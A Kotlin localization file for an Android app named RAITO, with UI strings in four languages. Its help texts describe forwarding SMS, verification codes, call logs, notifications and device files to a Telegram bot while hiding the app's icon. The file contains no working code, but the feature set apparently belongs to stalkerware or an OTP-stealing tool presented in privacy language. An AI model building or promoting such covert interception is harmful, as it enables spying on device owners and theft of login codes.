package com.example.ui

import androidx.compose.ui.unit.LayoutDirection

enum class AppLanguage(val code: String, val label: String, val flag: String, val direction: LayoutDirection) {
    PERSIAN("fa", "فارسی", "🇮🇷", LayoutDirection.Rtl),
    ENGLISH("en", "English", "🇺🇸", LayoutDirection.Ltr),
    RUSSIAN("ru", "Русский", "🇷🇺", LayoutDirection.Ltr),
    CHINESE("zh", "中文", "🇨🇳", LayoutDirection.Ltr);

    companion object {
        fun fromCode(code: String): AppLanguage {
            return values().find { it.code == code } ?: ENGLISH
        }
    }
}

object Translations {
    private val fa = mapOf(
        "app_title" to "رایتو (RAITO)",
        "bot_token_label" to "توکن ربات تلگرام",
        "bot_token_placeholder" to "توکن ربات را وارد کنید...",
        "chat_id_label" to "شناسه چت تلگرام (Chat ID)",
        "chat_id_placeholder" to "شناسه عددی چت یا خالی بزارید برای اتصال خودکار...",
        "status_running" to "هسته علمی-امنیتی رایتو فعال و در حال تبادل است",
        "status_stopped" to "سرویس پشتیبان و همگام‌ساز رایتو غیرفعال است",
        "btn_start" to "فعال‌سازی سرویس رایتو (RAITO)",
        "btn_stop" to "غیر فعال کردن سرویس همگام‌ساز",
        "caption_bar" to "هسته تله‌کست و مدیریت ارشد سیستم از راه دور",
        "tab_dashboard" to "کنترل مرکزی",
        "tab_logs" to "رخدادهای زنده",
        "tab_policy" to "خط‌مشی و مستندات",
        "notifications_permission" to "دسترسی نوتیفیکیشن",
        "sms_permission" to "دسترسی پیامک (SMS)",
        "permission_granted" to "✅ فعال شده",
        "permission_denied" to "❌ غیرفعال",
        "btn_grant" to "مدیریت دسترسی‌ها",
        "console_title" to "وقایع عملیاتی سیستم رایتو",
        "btn_clear_logs" to "پاکسازی کنسول",
        "chat_id_tip" to "💡 نکته: اگر شناسه چت را ندارید، فقط توکن را ذخیره کنید و در تلگرام به ربات پیام /start بدین تا خودکار چت شما متصل بشه!",
        "stats_battery" to "میزان باتری",
        "stats_storage" to "حافظه ذخیره‌سازی",
        "stats_network" to "وضعیت اینترنت",
        "stats_title" to "وضعیت کلی دستگاه رایتو",
        "no_logs" to "هنوز هیچ رویدادی ثبت نشده است.",
        "config_saved" to "پیکربندی رایتو با موفقیت ذخیره شد.",
        "policy_text" to "📱 سامانه هوشمند رایتو (RAITO Suite - نسخه 1.0.0)\n\nرایتو یک ابزار خصوصی، همگام‌ساز و مانیتورینگ آنلاین است که اطلاعات منتخب دستگاه هوشمند شما را به ربات اختصاصی تلگرام ارسال می‌کند. طراحی این نرم‌افزار به صورت بدون‌سرور واسط (Serverless) است؛ بدین معنا که اطلاعات شما هرگز به هیچ سرور ثالثی فرستاده نخواهد شد و تعاملات به طور مستقیم و امن به API رسمی تلگرام فرستاده می‌شوند.\n\n🔍 چگونگی شروع و کاربرد رایتو:\n۱. ابتدا با استفاده از شناسه BotFather@ در تلگرام یک ربات اختصاصی ایجاد کرده و توکن (Token) آن را دریافت نمایید.\n۲. توکن دریافت شده را به همراه شناسه عددی چت خود در بخش کنترل مرکزی نرم‌افزار ثبت و ذخیره کرده و روی دکمه فعال‌سازی کلیک نمایید.\n۳. اگر شناسه چت خود را نمی‌دانید، فقط توکن را ذخیره کرده و پیام /start را در تلگرام به ربات خود بفرستید تا چت شما به صورت خودکار شناسایی و همگام‌سازی شود.\n۴. دسترسی‌های مورد نیاز از جمله «همگام‌ساز نوتیفیکیشن» و «پیامک‌ها» را فعال نمایید و ترجیحا بهینه‌سازی مصرف باتری (Battery Optimization) را برای برنامه غیرفعال کنید تا فرآیند ارسال در پس‌زمینه بدون وقفه انجام پذیرد.\n\n⚙️ بخش‌های کلیدی نرم‌افزار:\n• دریافت و کنترل پیامک‌ها و کدهای تایید به صورت زنده\n• گزارش تماس‌های دریافتی، از دست رفته و خروجی با جزئیات کامل\n• همگام‌سازی اعلان‌های سیستمی و برنامه‌های پیام‌رسان به تفکیک برنامه\n• مدیریت از راه دور فایل‌ها در مسیر /storage/emulated/0 با دکمه‌های برگشت، ورود آسان و بازگشت به منوی اصلی\n• مجهز به قابلیت دریافت و دانلود فایل‌های گزارش متنی (.txt) اعلان‌ها و کل رویدادهای سیستم به تلگرام و داخل دستگاه جهت پایش همیشگی\n• پنهان‌سازی آیکون برنامه از صفحه خانه و منوی گوشی (جهت جلوگیری از دسترسی به اطلاعات به وسیله دیگران)\n\n⚠️ حریم خصوصی و سلب مسئولیت:\nتمامی فیلترها و کدهای دسترسی در کنترل کامل شماست. لطفاً توکن ربات خود را در اختیار هیچ شخص دیگری نگذارید. به عنوان توسعه‌دهنده، هیچ‌گونه دسترسی به اطلاعات حساس دستگاه شما وجود نداشته و هرگونه سوء استفاده یا عدم رعایت قوانین حریم خصوصی بر عهده کاربر نهایی می‌باشد.\n\nایمیل پشتیبانی و پیشنهادها:\nSinanetguard@gmail.com"
    )

    private val en = mapOf(
        "app_title" to "RAITO",
        "bot_token_label" to "Telegram Bot Token",
        "bot_token_placeholder" to "Enter bot token...",
        "chat_id_label" to "Telegram Chat ID",
        "chat_id_placeholder" to "Enter chat numeric ID, or leave blank to auto-bind...",
        "status_running" to "RAITO Core Active & Polling Commands",
        "status_stopped" to "RAITO Service is Offline",
        "btn_start" to "Activate RAITO Service",
        "btn_stop" to "Stop Background Service",
        "caption_bar" to "Mastermind Remote Synchronization Core",
        "tab_dashboard" to "Control Core",
        "tab_logs" to "Live Logs",
        "tab_policy" to "Help & Policies",
        "notifications_permission" to "Notification Sync Access",
        "sms_permission" to "SMS Interceptor Permission",
        "permission_granted" to "✅ GRANTED",
        "permission_denied" to "❌ DISMISSED",
        "btn_grant" to "Configure Permissions",
        "console_title" to "Operational Logs Console",
        "btn_clear_logs" to "Purge Console Logs",
        "chat_id_tip" to "💡 Hint: If you don't know your Chat ID, just enter & save the bot token, then type /start inside your telegram bot to auto-configure it!",
        "stats_battery" to "Battery Status",
        "stats_storage" to "Drive Capacity",
        "stats_network" to "Network Carrier",
        "stats_title" to "Active Hardware Profile",
        "no_logs" to "No system telemetry captured yet.",
        "config_saved" to "RAITO parameters cataloged successfully.",
        "policy_text" to "📱 RAITO Enterprise Intelligence Suite (Version 1.0.0)\n\nRAITO is a private, client-side, zero-intermediary server synchronization bridge designed to route system metrics, SMS messages, missed call alerts, and active notification alerts directly to your personal Telegram Bot. Because RAITO operates with a serverless architecture, your personal telemetry never touches any intermediary server; communications are established solely and directly between your device and the secure Telegram API.\n\n🔍 Quick Start & Operational Checklist:\n1. Create your secure private bot via @BotFather on Telegram and extract the unique HTTP API Token.\n2. Input this Token in the Central Control tab. If you know your numeric Telegram UserID, enter it as Chat ID and press Start Service.\n3. If your Chat ID is unknown, simply input the Token, save changes, and trigger a '/start' command directly inside your bot chat window in Telegram. The software will dynamically capture your Chat ID and pair itself!\n4. Authorize 'Notification Sync Access' and 'SMS' permissions. We recommend white-listing RAITO from the system's battery optimization daemon to prevent background service idling.\n\n⚙️ Primary Technical Capabilities:\n• Real-time SMS interceptor & incoming authentication code parser.\n• Instant Call Logging (Incoming, Outgoing, and Missed) delivered as clean reports.\n• Deep application notification capturing (supporting chat platforms like Whatsapp, Telegram, etc).\n• Private File Manager targeting /storage/emulated/0 with fully interactive navigation directory trees, easy back & enter buttons, and exit features.\n• Local log storage with .txt file exports for both notifications and system actions directly to your Downloads directory or Telegram workspace.\n• Adaptive system stealth execution layer to disable icon trails in system app drawer and desktop menus.\n\n⚠️ Privacy Statement & Disclaimers:\nAll operational logs, network endpoints, and data caching are handled exclusively on-device. Never disclose your Telegram Bot Token to unknown individuals. Built with privacy-first standards, the developers have zero access to your captured messages. All security protocols and risks involved with data synchronization reside strictly with the master administrator of the device.\n\n✉️ Suggestions & Inquiry Email:\nSinanetguard@gmail.com"
    )

    private val ru = mapOf(
        "app_title" to "RAITO",
        "bot_token_label" to "Токен Telegram Бота",
        "bot_token_placeholder" to "Введите токен вашего бота...",
        "chat_id_label" to "ID Чата Telegram",
        "chat_id_placeholder" to "Введите ID чата или оставьте пустым для автопривязки...",
        "status_running" to "Ядро RAITO Активно и Опрашивает Команды",
        "status_stopped" to "Служба RAITO Отключена",
        "btn_start" to "Активировать Службу RAITO",
        "btn_stop" to "Остановить Фоновое Вещание",
        "caption_bar" to "Информационная Защита и Удаленный Контроль",
        "tab_dashboard" to "Главная Панель",
        "tab_logs" to "Телеметрия",
        "tab_policy" to "Политика и Справка",
        "notifications_permission" to "Доступ к Системным Уведомлениям",
        "sms_permission" to "Перехватчик Входящих SMS",
        "permission_granted" to "✅ РАЗРЕШЕНО",
        "permission_denied" to "❌ ОТКЛОНЕНО",
        "btn_grant" to "Настроить Права Доступа",
        "console_title" to "Консоль Системных Событий",
        "btn_clear_logs" to "Очистить Историю Событий",
        "chat_id_tip" to "💡 Подсказка: Если вы не знаете свой Chat ID, сохраните только токен, а затем отправьте команду /start вашему боту в Telegram для автопривязки!",
        "stats_battery" to "Емкость Батареи",
        "stats_storage" to "Свободная Память",
        "stats_network" to "Адаптер Сети",
        "stats_title" to "Параметры Устройства",
        "no_logs" to "Телеметрия пуста. Ожидание событий...",
        "config_saved" to "Параметры RAITO успешно применены.",
        "policy_text" to "📱 Умная система RAITO Enterprise (Версия 1.0.0)\n\nRAITO — это высококонфиденциальное локальное приложение для синхронизации и контроля уведомлений на нескольких устройствах. Оно перенаправляет SMS, журналы звонков и системные уведомления прямо в ваш персональный Telegram-бот.\n\n🔍 Быстрый старт:\n1. Создайте секретного бота через BotFather@ в Telegram и скопируйте API-токен.\n2. Вставьте его в панель управления RAITO и сохраните.\n3. Отправьте своему боту команду /start из Telegram — устройство привяжется автоматически.\n4. Предоставьте доступ к звонкам, SMS и системным уведомлениям для стабильной фоновой работы.\n\n⚙️ Основные функции:\n• Наблюдение за SMS и историей звонков в реальном времени.\n• Полная навигация по файлам в каталоге /storage/emulated/0 с удобными кнопками входа, выхода и возврата в меню.\n• Экспорт журналов уведомлений и системных записей в текстовые файлы .txt для глубокого анализа.\n• Режим невидимки для скрытия ярлыка приложения.\n\n⚠️ Конфиденциальность:\nПередача данных идет напрямую на серверы Telegram без посторонних посредников. Не раскрывайте посторонним токен вашего бота.\n\n✉️ Контакты разработчика:\nSinanetguard@gmail.com"
    )

    private val zh = mapOf(
        "app_title" to "RAITO",
        "bot_token_label" to "Telegram 机器人令牌",
        "bot_token_placeholder" to "输入您的机器人 Token...",
        "chat_id_label" to "Telegram 聊天 ID",
        "chat_id_placeholder" to "输入聊天 ID (或留空以便发送指令自动绑定)...",
        "status_running" to "RAITO 智能控制中心处理中",
        "status_stopped" to "RAITO 后台监控已停用",
        "btn_start" to "开启 RAITO 智能服务",
        "btn_stop" to "中止后台核心服务",
        "caption_bar" to "智能云端与多端数据同步核心",
        "tab_dashboard" to "控制核心",
        "tab_logs" to "控制台日志",
        "tab_policy" to "帮助及协议",
        "notifications_permission" to "通知捕获监视权限",
        "sms_permission" to "短信重定向拦截权限",
        "permission_granted" to "✅ 已授权",
        "permission_denied" to "❌ 未授权",
        "btn_grant" to "去配置权限",
        "console_title" to "系统运行遥测控制台",
        "btn_clear_logs" to "清除控制台缓存",
        "chat_id_tip" to "💡 提示：如果您不知晓 Chat ID，请仅输入并保存机器人 Token，然后在 Telegram 中对您的机器人发送 /start 指令即可自动登记绑定您的 ID！",
        "stats_battery" to "设备剩余电池",
        "stats_storage" to "存储驱动器容量",
        "stats_network" to "网络连接配置",
        "stats_title" to "运行期系统硬件参数",
        "no_logs" to "尚无事件遥测数据被捕获。",
        "config_saved" to "RAITO 配置参数保存成功。",
        "policy_text" to "📱 RAITO 个人安全数据实时同步控制台 (版本 1.0.0)\n\nRAITO 是一款精密的私有化多设备状态安全监控与事件重定向同步工具。软件完全采用无第三方云服务商（Serverless）的隐私保护架构，使短信、通话历史、通知日志安全直连您的私有 Telegram 机器人控制面板，拒绝敏感信息泄露。\n\n🔍 操作指南：\n1. 通过 Telegram 的 @BotFather 新建专属机器人并获取专属 API 令牌。\n2. 在配置面板中填入令牌 and 接收账号标识，点击启动。\n3. 若聊天 ID 待定，请在填入并保存 Token 后对聊天窗发送 /start，系统即可成功自动绑定。\n4. 为本程序赋予「外部存储管理」与「短信拦截读取」等关联权限，即可激活核心后台进程。\n\n⚙️ 功能概述：\n• 实时的短信捕获以及通话跟踪记录。\n• 功能丰富的本地文件资源浏览器（/storage/emulated/0），专设快捷进入目录、快速上退以及一键返回主菜单的极便利双向按键操作。\n• 简便易得的通知和系统日志生成控制，一键导出至本地 /Downloads 目录或通过 Telegram 文件消息下载并保存（.txt）。\n• 顶级的全局伪装隐身层，安全在主屏幕抹除应用启动痕迹。\n\n⚠️ 免责保障：\n数据传输流程均直接投递 Telegram 安全认证通道，本开发不收集不存留任何私有通信信息，切忌对任何第三方泄露您的机器人身份信息，保护您与系统的完美契合。\n\n✉️ 技术服务邮箱：\nSinanetguard@gmail.com"
    )

    fun get(key: String, language: AppLanguage): String {
        return when (language) {
            AppLanguage.PERSIAN -> fa[key] ?: en[key] ?: ""
            AppLanguage.RUSSIAN -> ru[key] ?: en[key] ?: ""
            AppLanguage.CHINESE -> zh[key] ?: en[key] ?: ""
            AppLanguage.ENGLISH -> en[key] ?: ""
        }
    }
}
